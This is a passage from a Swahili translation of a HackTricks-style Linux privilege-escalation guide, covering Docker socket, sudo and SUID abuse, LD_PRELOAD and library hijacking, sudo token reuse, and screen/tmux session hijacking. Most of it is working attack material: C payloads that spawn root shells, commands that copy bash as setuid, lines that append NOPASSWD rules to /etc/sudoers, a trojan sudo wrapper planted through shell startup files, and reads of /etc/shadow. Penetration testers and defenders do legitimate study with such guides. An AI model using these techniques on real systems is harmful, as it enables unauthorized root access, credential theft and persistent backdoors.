3.  **Ambatisha kwa Kontena:** Tumia `socat` kuweka uhusiano na kontena, kuruhusu utekelezaji wa amri ndani yake.

```bash
socat - UNIX-CONNECT:/var/run/docker.sock
POST /containers/<NewContainerID>/attach?stream=1&stdin=1&stdout=1&stderr=1 HTTP/1.1
Host:
Connection: Upgrade
Upgrade: tcp
```

Baada ya kuweka uhusiano wa `socat`, unaweza kutekeleza amri moja kwa moja kwenye kontena na ufikiaji wa kiwango cha mizizi kwenye mfumo wa mwenyeji.

### Mambo Mengine

Tafadhali kumbuka kwamba ikiwa una ruhusa za kuandika juu ya soketi ya docker kwa sababu uko **ndani ya kikundi cha `docker`** una [**njia zaidi za kuongeza viwango vya ruhusa**](interesting-groups-linux-pe/#docker-group). Ikiwa [**API ya docker inasikiliza kwenye bandari** unaweza pia kuweza kuishambulia](../../network-services-pentesting/2375-pentesting-docker.md#compromising).

Angalia **njia zaidi za kuvunja kutoka kwa docker au kuitumia kuongeza viwango vya ruhusa** katika:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Kupandisha Viwango vya Uruhusu kwa Containerd (ctr)

Ikiwa unagundua kwamba unaweza kutumia amri ya **`ctr`** soma ukurasa ufuatao kwani **unaweza kuitumia kwa kuvuka viwango vya ruhusa**:

{% content-ref url="containerd-ctr-privilege-escalation.md" %}
[containerd-ctr-privilege-escalation.md](containerd-ctr-privilege-escalation.md)
{% endcontent-ref %}

## Kupandisha Viwango vya Uruhusu kwa **RunC**

Ikiwa unagundua kwamba unaweza kutumia amri ya **`runc`** soma ukurasa ufuatao kwani **unaweza kuitumia kwa kuvuka viwango vya ruhusa**:

{% content-ref url="runc-privilege-escalation.md" %}
[runc-privilege-escalation.md](runc-privilege-escalation.md)
{% endcontent-ref %}

## **D-Bus**

D-Bus ni **mfumo wa Mawasiliano kati ya Michakato (IPC)** wa kisasa ambao huruhusu programu kuingiliana na kushiriki data kwa ufanisi. Iliyoundwa kwa kuzingatia mfumo wa Linux wa kisasa, inatoa mfumo imara kwa aina tofauti za mawasiliano ya programu.

Mfumo huu ni mpana, ukisaidia IPC ya msingi ambayo inaboresha kubadilishana data kati ya michakato, ikikumbusha soketi za eneo la UNIX zilizoboreshwa. Zaidi ya hayo, inasaidia kutangaza matukio au ishara, ikisaidia ushirikiano laini kati ya sehemu za mfumo. Kwa mfano, ishara kutoka kwa kionyeshi cha Bluetooth kuhusu simu ya kuingia inaweza kusababisha mpiga muziki kuzima sauti, ikiboresha uzoefu wa mtumiaji. Aidha, D-Bus inasaidia mfumo wa vitu vya mbali, ikisimplisha maombi ya huduma na mwaliko wa njia kati ya programu, ikipunguza mchakato ambao kihistoria ulikuwa mgumu.

D-Bus inafanya kazi kwa mfano wa **ruhusa/kataa**, ikisimamia ruhusa za ujumbe (wito wa njia, kutuma ishara, n.k.) kulingana na athari jumla ya sheria za sera zinazolingana. Sera hizi hufafanua mwingiliano na basi, ikiruhusu kwa uwezekano wa kupandisha viwango vya ruhusa kupitia unyanyasaji wa ruhusa hizi.

Mfano wa sera kama hiyo katika `/etc/dbus-1/system.d/wpa_supplicant.conf` unatolewa, ukielezea ruhusa kwa mtumiaji wa mizizi kumiliki, kutuma kwa, na kupokea ujumbe kutoka kwa `fi.w1.wpa_supplicant1`.

Sera bila mtumiaji au kikundi kilichotajwa inatumika kwa kila mtu, wakati sera za muktadha "default" zinatumika kwa wote ambao hawajashughulikiwa na sera maalum zingine.
```xml
<policy user="root">
<allow own="fi.w1.wpa_supplicant1"/>
<allow send_destination="fi.w1.wpa_supplicant1"/>
<allow send_interface="fi.w1.wpa_supplicant1"/>
<allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```
**Jifunze jinsi ya kuchunguza na kutumia mawasiliano ya D-Bus hapa:**

{% content-ref url="d-bus-enumeration-and-command-injection-privilege-escalation.md" %}
[d-bus-enumeration-and-command-injection-privilege-escalation.md](d-bus-enumeration-and-command-injection-privilege-escalation.md)
{% endcontent-ref %}

## **Mtandao**

Ni vyema siku zote kuchunguza mtandao na kubaini mahali pa mashine.

### Uchunguzi wa kawaida
```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#Files used by network services
lsof -i
```
### Viokelea zilizofunguliwa

Daima hakikisha huduma za mtandao zinazoendeshwa kwenye mashine ambazo haukuweza kuingiliana nazo kabla ya kuzifikia:
```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
```
### Kunusa

Angalia kama unaweza kunusa trafiki. Ukifanikiwa, unaweza kupata baadhi ya siri za kuingia.
```
timeout 1 tcpdump
```
## Watumiaji

### Uchambuzi wa Kawaida

Angalia **wewe ni nani**, ni **madaraka** gani unayo, ni **watumiaji** gani wako kwenye mifumo, ni yupi anaweza **kuingia** na yupi ana **madaraka ya mzizi:**
```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
w
#Login history
last | tail
#Last log of each user
lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```
### UID Kubwa

Baadhi ya toleo za Linux ziliathiriwa na mdudu ambao huruhusu watumiaji wenye **UID > INT\_MAX** kuongeza mamlaka. Maelezo zaidi: [hapa](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [hapa](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) na [hapa](https://twitter.com/paragonsec/status/1071152249529884674).\
**Tumia** kwa: **`systemd-run -t /bin/bash`**

### Vikundi

Angalia kama wewe ni **mwanachama wa kikundi fulani** ambacho kinaweza kukupa mamlaka ya mzizi:

{% content-ref url="interesting-groups-linux-pe/" %}
[interesting-groups-linux-pe/](interesting-groups-linux-pe/)
{% endcontent-ref %}

### Ubao wa Kuchorea

Angalia kama kuna kitu cha kuvutia kilichopo ndani ya ubao wa kuchorea (ikiwezekana)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Sera ya Nywila
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Nywila Zinazojulikana

Ikiwa **unajua nywila yoyote** ya mazingira **jaribu kuingia kama kila mtumiaji** ukitumia nywila hiyo.

### Su Brute

Ikiwa haujali kufanya kelele nyingi na programu za `su` na `timeout` zipo kwenye kompyuta, unaweza kujaribu kuvunja nguvu mtumiaji kwa kutumia [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) ikiwa na kiparameta `-a` pia inajaribu kuvunja nguvu watumiaji.

## Mabaya ya PATH yanayoweza Kuandikwa

### $PATH

Ikiwa unagundua kuwa unaweza **kuandika ndani ya folda fulani ya $PATH** unaweza kuinua mamlaka kwa **kuunda mlango wa nyuma ndani ya folda inayoweza kuandikwa** kwa jina la amri fulani ambayo itatekelezwa na mtumiaji tofauti (kimsingi root) na ambayo **haipakuliwi kutoka kwenye folda iliyopo kabla** ya folda yako inayoweza kuandikwa kwenye $PATH.

### SUDO na SUID

Unaweza kuruhusiwa kutekeleza amri fulani kwa kutumia sudo au wanaweza kuwa na biti ya suid. Angalia kwa kutumia:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Baadhi ya **amri zisizotarajiwa kuruhusu kusoma na/au kuandika faili au hata kutekeleza amri.** Kwa mfano:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### BILA NENO LA SIRI

Usanidi wa Sudo unaweza kuruhusu mtumiaji kutekeleza amri fulani kwa mamlaka ya mtumiaji mwingine bila kujua neno la siri.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
Katika mfano huu mtumiaji `demo` anaweza kukimbia `vim` kama `root`, sasa ni rahisi kupata shell kwa kuongeza ufunguo wa ssh kwenye saraka ya root au kwa kuita `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Mwongozo huu huruhusu mtumiaji **kuweka mazingira ya mazingira** wakati wa kutekeleza kitu:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Mfano huu, **ukitegemea kifaa cha HTB Admirer**, ulikuwa **dhaifu** kwa **PYTHONPATH hijacking** ili kupakia maktaba ya Python ya kupendelea wakati wa kutekeleza script kama root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Kupita kwa utekelezaji wa Sudo bila kufuata njia

**Ruka** ili kusoma faili nyingine au tumia **symlinks**. Kwa mfano katika faili ya sudoers: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ikiwa **wildcard** inatumika (\*), ni rahisi zaidi:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Mbinu za Kukabiliana**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Amri ya Sudo/Binary ya SUID bila njia ya amri

Ikiwa **ruhusa ya sudo** imetolewa kwa amri moja **bila kutoa njia**: _hacker10 ALL= (root) less_ unaweza kutumia udhaifu huo kwa kubadilisha PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Teknolojia hii inaweza kutumika pia ikiwa **suid** binary **inaendesha amri nyingine bila kutoa njia ya kuipata (hakikisha daima unachunguza na** _**strings**_ **maudhui ya suid binary ya ajabu)**.

[Mifano ya mzigo wa kutekeleza.](payloads-to-execute.md)

### Suid binary na njia ya amri

Ikiwa **suid** binary **inaendesha amri nyingine ikitoa njia**, basi, unaweza **jaribu kutekeleza kazi** iliyoitwa kama amri ambayo faili ya suid inaita.

Kwa mfano, ikiwa binary ya suid inaita _**/usr/sbin/service apache2 start**_ unapaswa kujaribu kuunda kazi na kuiegesha:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD\_PRELOAD & **LD\_LIBRARY\_PATH**

Mazingira ya **LD\_PRELOAD** hutumika kutaja maktaba moja au zaidi zinazoshirikishwa (faili za .so) zitakazopakiwa na mzigo kabla ya zingine zote, ikiwa ni pamoja na maktaba ya kawaida ya C (`libc.so`). Mchakato huu unajulikana kama kushirikisha kabla ya maktaba.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kuchukuliwa faida, hasa na utekelezaji wa **suid/sgid** zinazoweza kutekelezwa, mfumo unatekeleza hali fulani:

- Mzigo hauzingatii **LD\_PRELOAD** kwa programu zinazoweza kutekelezwa ambapo kitambulisho halisi cha mtumiaji (_ruid_) hakilingani na kitambulisho cha mtumiaji kilichopo (_euid_).
- Kwa programu zinazoweza kutekelezwa na suid/sgid, maktaba zinazopakiwa kabla ni zile zilizo kwenye njia za kawaida ambazo pia ni suid/sgid.

Kupandisha hadhi kunaweza kutokea ikiwa una uwezo wa kutekeleza amri kwa kutumia `sudo` na matokeo ya `sudo -l` yanajumuisha kauli **env\_keep+=LD\_PRELOAD**. Usanidi huu huruhusu mazingira ya **LD\_PRELOAD** kudumu na kutambuliwa hata wakati amri zinatekelezwa kwa kutumia `sudo`, ikiongoza kwa utekelezaji wa nambari ya aina yoyote na hadhi iliyoinuliwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **sakinisha** kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **ongeza mamlaka** zinazoendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
{% hint style="danger" %}
Kama mshambuliaji anadhibiti **LD\_LIBRARY\_PATH** env variable kwa sababu anadhibiti njia ambapo maktaba zitatafutwa, privesc sawa inaweza kutumiwa vibaya.
{% endhint %}
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### Binary ya SUID - Uingizaji wa .so

Uponapo kutana na binary yenye ruhusa ya **SUID** ambayo inaonekana isiyo ya kawaida, ni vizuri kuhakikisha kama inapakia faili za **.so** ipasavyo. Hii inaweza kuthibitishwa kwa kukimbia amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O\_RDONLY) = -1 ENOENT (Hakuna faili au saraka kama hiyo)"_ inaashiria uwezekano wa kutumia.

Kutumia hili, mtu angeendelea kwa kuunda faili ya C, sema _"/path/to/.config/libcalc.c"_, yenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, mara baada ya kuchakatwa na kutekelezwa, lengo lake ni kukuza mamlaka kwa kubadilisha ruhusa za faili na kutekeleza kifaa na mamlaka yaliyopandishwa.

Chakata faili ya C hapo juu kuwa faili ya kitu kilichoshirikishwa (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kukimbia faili ya SUID iliyoharibiwa inapaswa kuzindua shambulio, kuruhusu uwezekano wa kudukua mfumo. 

## Udukuzi wa Vitu vya Kielelezo vilivyoshirikishwa
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa tumeona binary ya SUID ikiload maktaba kutoka kwenye folda ambapo tunaweza kuandika, tujenge maktaba hiyo kwenye folda hiyo na jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ikiwa unapata kosa kama hilo
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
Hii inamaanisha kwamba maktaba uliyoitengeneza inahitaji kuwa na kazi inayoitwa `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kukiuka vizuizi vya usalama wa ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa hali ambapo unaweza **kuingiza tu hoja** katika amri.

Mradi huu unakusanya kazi halali za Unix binaries ambazo zinaweza kutumiwa kwa madhara ya kuvunja vikasha vilivyozuiwa, kukuza au kudumisha mamlaka zilizo juu, kuhamisha faili, kuzalisha bind na reverse shells, na kurahisisha kazi zingine za baada ya kuvamia.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'

{% embed url="https://gtfobins.github.io/" %}

{% embed url="https://gtfoargs.github.io/" %}

### FallOfSudo

Ikiwa unaweza kupata `sudo -l` unaweza kutumia zana [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) kuangalia ikiwa inagundua jinsi ya kutumia sheria yoyote ya sudo.

### Kutumia Upya Vyeti vya Sudo

Katika hali ambapo una **upatikanaji wa sudo** lakini sio nenosiri, unaweza kukuza mamlaka kwa **kungojea utekelezaji wa amri ya sudo na kisha kuteka nyara ishara ya kikao**.

Mahitaji ya kukuza mamlaka:

* Tayari una ganda kama mtumiaji "_sampleuser_"
* "_sampleuser_" ame **tumia `sudo`** kutekeleza kitu katika **dakika 15 zilizopita** (kwa chaguo-msingi hiyo ni muda wa ishara ya sudo inayoturuhusu kutumia `sudo` bila kuingiza nenosiri lolote)
* `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
* `gdb` inapatikana (unaweza kuweza kuipakia)

(Unaweza kuwezesha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kubadilisha kwa kudumu `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Ikiwa mahitaji yote haya yanakidhiwa, **unaweza kukuza mamlaka kwa kutumia:** [**https://github.com/nongiach/sudo\_inject**](https://github.com/nongiach/sudo\_inject)

* **Uvamizi wa kwanza** (`exploit.sh`) utaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kutumia hiyo kuiwezesha ishara ya sudo katika kikao chako (hutapata moja kwa moja ganda la mizizi, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
* **Exploit ya pili** (`exploit_v2.sh`) itaunda sh shell katika _/tmp_ **iliyomilikiwa na root na setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
* **Kudukua ya tatu** (`kudukua_v3.sh`) itaunda **faili ya sudoers** ambayo inafanya **vitufe vya sudo kuwa vya milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Jina la Mtumiaji>

Ikiwa una **ruhusa za kuandika** kwenye folda au kwenye faili yoyote iliyoundwa ndani ya folda unaweza kutumia binary [**write\_sudo\_token**](https://github.com/nongiach/sudo\_inject/tree/master/extra\_tools) **kuunda token ya sudo kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kubadilisha faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo na PID 1234, unaweza **kupata ruhusa za sudo** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili ndani ya `/etc/sudoers.d` huzingatia ni nani anaweza kutumia `sudo` na jinsi gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na mtumiaji root na kikundi root**.\
**Ikiwa** unaweza **kusoma** faili hii unaweza kuwa na uwezo wa **kupata habari za kuvutia**, na ikiwa unaweza **kuandika** faili yoyote utaweza **kupandisha vyeo**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika unaweza kutumia ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibali hivi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna njia mbadala za faili ya `sudo` kama vile `doas` kwa OpenBSD, kumbuka kuangalia mazingira yake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Udukuzi wa Sudo

Ikiwa unajua kwamba **mtumiaji kawaida hujihusisha na mashine na kutumia `sudo`** kuongeza mamlaka na umepata shell ndani ya muktadha huo wa mtumiaji, unaweza **kuunda faili mpya ya sudo** ambayo itatekeleza nambari yako kama root na kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya muktadha wa mtumiaji (kwa mfano kwa kuongeza njia mpya katika .bash\_profile) ili wakati mtumiaji anatekeleza sudo, faili yako ya sudo itatekelezwa.

Tafadhali kumbuka kwamba ikiwa mtumiaji anatumia kabati tofauti (si bash) utahitaji kuhariri faili nyingine kuongeza njia mpya. Kwa mfano [sudo-piggyback](https://github.com/APTy/sudo-piggyback) inabadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Au kutekeleza kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Maktaba ya Pamoja

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **mahali ambapo faili za mipangilio iliyopakiwa zinatoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hii inamaanisha kuwa faili za mipangilio kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za mipangilio **zinaweza kuelekeza kwenye folda nyingine** ambapo **maktaba** zitatafutwa. Kwa mfano, yaliyomo kwenye `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta maktaba ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa ya kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya mipangilio ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuwa na uwezo wa kukuza mamlaka.\
Angalia **jinsi ya kutumia vibaya hii hitilafu ya mipangilio** kwenye ukurasa ufuatao:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kuchapisha lib ndani ya `/var/tmp/flag15/` itatumika na programu mahali hapa kama ilivyoelezwa katika `RPATH` variable.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
### Tengeneza maktaba mbaya katika `/var/tmp` kwa kutumia `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Uwezo

Uwezo wa Linux hutoa **sehemu ya mizizi inayopatikana kwa mchakato**. Hii kimsingi inagawa **uwezo wa mizizi katika vitengo vidogo na vya kipekee**. Kila moja ya vitengo hivi inaweza kutolewa kwa mchakato kivyake. Kwa njia hii seti kamili ya uwezo inapunguzwa, ikipunguza hatari za unyonyaji.\
Soma ukurasa ufuatao kujifunza zaidi kuhusu uwezo na jinsi ya **kutumia vibaya**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Ruhusa za Direktori

Katika saraka, **biti ya "utekelezaji"** inamaanisha kuwa mtumiaji anayehusika anaweza "**cd**" kuingia katika saraka.\
Biti ya **"soma"** inamaanisha mtumiaji anaweza **kuorodhesha** **faili**, na biti ya **"andika"** inamaanisha mtumiaji anaweza **kufuta** na **kuunda** **faili** mpya.

## ACLs

Orodha za Kudhibiti Upatikanaji (ACLs) zinaonyesha safu ya pili ya ruhusa za hiari, zenye uwezo wa **kubadilisha ruhusa za jadi za ugo/rwx**. Ruhusa hizi huongeza udhibiti juu ya ufikiaji wa faili au saraka kwa kuruhusu au kukataa haki kwa watumiaji maalum ambao si wamiliki au sehemu ya kikundi. Kiwango hiki cha **ufafanuzi kuhakikisha usimamizi sahihi wa ufikiaji**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Toa** mtumiaji "kali" ruhusa za kusoma na kuandika kwenye faili:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** faili zenye ACLs maalum kutoka kwenye mfumo:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Fungua vikao vya kabati

Katika **toleo za zamani** unaweza **kuiba** vikao vya kabati vya mtumiaji mwingine (**root**).\
Katika **toleo jipya zaidi** utaweza **kuunganisha** kwenye vikao vya skrini tu vya **mtumiaji wako mwenyewe**. Hata hivyo, unaweza kupata **habari za kuvutia ndani ya kikao**.

### kuiba vikao vya skrini

**Orodhesha vikao vya skrini**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../.gitbook/assets/image (141).png>)

**Ambatisha kwenye kikao**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Kuteka vikao vya tmux

Hii ilikuwa tatizo na **toleo za zamani za tmux**. Sikufanikiwa kuteka kikao cha tmux (v2.1) kilichoundwa na root kama mtumiaji asiye na mamlaka.

**Orodhesha vikao vya tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (837).png>)

**Ambatisha kwenye kikao**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Angalia **Valentine box kutoka HTB** kama mfano.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Funguo zote za SSL na SSH zilizozalishwa kwenye mifumo ya Debian (Ubuntu, Kubuntu, nk) kati ya Septemba 2006 na Mei 13, 2008 zinaweza kuathiriwa na kosa hili.\
Kosa hili husababishwa wakati wa kujenga funguo mpya za ssh kwenye mifumo hiyo, kwani **ni mchanganyiko wa 32,768 pekee uliowezekana**. Hii inamaanisha kuwa uwezekano wote unaweza kuhesabiwa na **ukiwa na funguo ya umma ya ssh unaweza kutafuta funguo ya kibinafsi inayolingana**. Unaweza kupata uwezekano uliohesabiwa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Vipimo vya Usanidi Vinavyovutia

* **PasswordAuthentication:** Inabainisha ikiwa uthibitishaji wa nywila unaruhusiwa. Chaguo msingi ni `hapana`.
* **PubkeyAuthentication:** Inabainisha ikiwa uthibitishaji wa funguo za umma unaruhusiwa. Chaguo msingi ni `ndiyo`.
* **PermitEmptyPasswords**: Wakati uthibitishaji wa nywila unaruhusiwa, inabainisha ikiwa seva inaruhusu kuingia kwenye akaunti zenye herufi za nywila tupu. Chaguo msingi ni `hapana`.

### PermitRootLogin

Inabainisha ikiwa root anaweza kuingia kwa kutumia ssh, chaguo msingi ni `hapana`. Inawezekana kuwa na thamani zifuatazo:

* `ndiyo`: root anaweza kuingia kwa kutumia nywila na funguo ya kibinafsi
* `bila-nywila` au `zuia-nywila`: root anaweza kuingia tu kwa kutumia funguo ya kibinafsi
* `amri-zilizolazimishwa-pekee`: Root anaweza kuingia kwa kutumia funguo ya kibinafsi pekee na ikiwa chaguo la amri limetajwa
* `hapana`: hapana

### AuthorizedKeysFile

